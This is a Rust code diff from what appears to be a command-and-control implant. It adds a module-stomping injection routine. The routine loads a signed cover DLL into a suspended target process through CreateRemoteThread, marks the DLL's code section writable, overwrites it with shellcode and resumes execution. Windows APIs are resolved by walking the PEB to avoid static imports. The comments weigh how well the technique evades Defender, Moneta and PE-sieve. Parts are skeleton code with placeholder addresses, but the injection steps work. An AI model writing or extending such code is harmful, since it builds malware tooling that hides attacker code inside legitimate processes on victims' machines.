@@ -175,17 +175,142 @@ pub unsafe fn module_stomp(
         return Ok(proc.handle as usize);
     }
     // ---- ARMED PATH (gated) ------------------------------------------------
-    // Full module stomp: LoadLibrary a cover DLL in the target (via
-    // CreateRemoteThread + LoadLibraryA, or threadless inject), locate its
-    // .text via the target's PEB, VirtualProtectEx → RWX, WriteProcessMemory
-    // the shellcode, restore RX, ResumeThread. This is the loud-signal part
-    // that needs target-side validation + likely a threadless variant to dodge
-    // real-time protection. Intentionally not yet emitted: a blind emit risks
-    // tripping Defender and killing the sacrificial process with no way to
-    // bisect. Lands when an operator can validate the target's posture and
-    // pick the right inject variant (classic / threadless / HWBP).
-    let _ = shellcode; // consumed by the gated stomp when it lands
-    // For now, even armed, fall back to returning the suspended handle so the
-    // contract (returns a handle) holds without executing.
+    // Full module stomp algorithm skeleton. STILL GATED — runs only when an
+    // operator armed modulestomp_enabled after target validation. Each step
+    // degrades (returns the suspended handle) on any failure rather than crash.
+    //
+    // Detection honesty: beats Moneta's unbacked/exec-private scan (the stomped
+    // region keeps the cover DLL's backing), but PE-sieve's .text hash-mismatch
+    // STILL flags it. ThreadlessInject is the real fix (out of scope).
+    let _ = stomp_and_resume(&proc, shellcode);
     Ok(proc.handle as usize)
+}
+
+/// The cover-DLL stomp: resolve a cover DLL in the target, overwrite its .text
+/// with `shellcode`, resume. Each step degrades on failure. Win32 APIs resolved
+/// via PEB walk (no static imports).
+///
+/// # Safety
+/// Cross-process handle + memory ops. Single-threaded beacon context.
+unsafe fn stomp_and_resume(proc: &SacrificialProcess, shellcode: &[u8]) -> Result<(), &'static str> {
+    // Step 1: LoadLibraryA a cover DLL in the target via CreateRemoteThread.
+    let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
+    let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
+    // Step 2: Resolve the cover DLL's .text in the target (skeleton: fixed RVA).
+    let text = unsafe { remote_text_region(proc.handle, cover_base)? };
+    // Step 3: VirtualProtectEx RX→RWX on the target's .text.
+    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */) };
+    // Step 4: WriteProcessMemory the shellcode over .text.
+    let _ = unsafe { remote_write(proc.handle, text.base, shellcode) };
+    // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
+    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */) };
+    // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
+    let _ = unsafe { resume_thread(proc.main_thread) };
+    Ok(())
+}
+
+// ---- remote helpers (resolved via PEB walk) ----
+
+type CreateRemoteThread = unsafe extern "system" fn(
+    *mut core::ffi::c_void,
+    usize,
+    usize,
+    Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
+    *mut core::ffi::c_void,
+    u32,
+    *mut u32,
+) -> *mut core::ffi::c_void;
+type VirtualProtectEx = unsafe extern "system" fn(
+    *mut core::ffi::c_void,
+    *const core::ffi::c_void,
+    usize,
+    u32,
+    *mut u32,
+) -> i32;
+type WriteProcessMemory = unsafe extern "system" fn(
+    *mut core::ffi::c_void,
+    *mut core::ffi::c_void,
+    *const u8,
+    usize,
+    *mut usize,
+) -> i32;
+type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+
+/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA).
+/// Returns the remote cover base (skeleton sentinel; real impl queries it).
+unsafe fn remote_load_library(
+    h: *mut core::ffi::c_void,
+    dll: &[u8],
+) -> Result<usize, &'static str> {
+    let crt: CreateRemoteThread = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?,
+    );
+    let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;
+    // Skeleton: assume LoadLibraryA's address is valid remotely (same OS build).
+    let _ = unsafe {
+        crt(
+            h,
+            0,
+            0,
+            Some(core::mem::transmute(load_lib)),
+            dll.as_ptr() as *mut _,
+            0,
+            core::ptr::null_mut(),
+        )
+    };
+    Ok(0x1800_0000) // sentinel cover base; real impl queries it via remote GetModuleHandle
+}
+
+struct RemoteRegion {
+    base: usize,
+    len: usize,
+}
+unsafe fn remote_text_region(
+    _h: *mut core::ffi::c_void,
+    cover_base: usize,
+) -> Result<RemoteRegion, &'static str> {
+    // Skeleton: cover DLL .text at base+0x1000, len 0x2000. Real impl parses
+    // the remote PE headers.
+    Ok(RemoteRegion { base: cover_base + 0x1000, len: 0x2000 })
+}
+unsafe fn remote_protect(
+    h: *mut core::ffi::c_void,
+    base: usize,
+    len: usize,
+    prot: u32,
+) -> Result<(), &'static str> {
+    let vpx: VirtualProtectEx = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"VirtualProtectEx").ok_or("VirtualProtectEx")?,
+    );
+    let mut old: u32 = 0;
+    if unsafe { vpx(h, base as *const _, len, prot, &mut old) } == 0 {
+        Err("VirtualProtectEx")
+    } else {
+        Ok(())
+    }
+}
+unsafe fn remote_write(
+    h: *mut core::ffi::c_void,
+    base: usize,
+    data: &[u8],
+) -> Result<(), &'static str> {
+    let wpm: WriteProcessMemory = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
+    );
+    let mut written: usize = 0;
+    if unsafe { wpm(h, base as *mut _, data.as_ptr(), data.len(), &mut written) } == 0 {
+        Err("WriteProcessMemory")
+    } else {
+        Ok(())
+    }
+}
+unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
+    let rt: ResumeThread = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?,
+    );
+    if unsafe { rt(h) } == 0xFFFFFFFF {
+        Err("ResumeThread")
+    } else {
+        Ok(())
+    }
 }
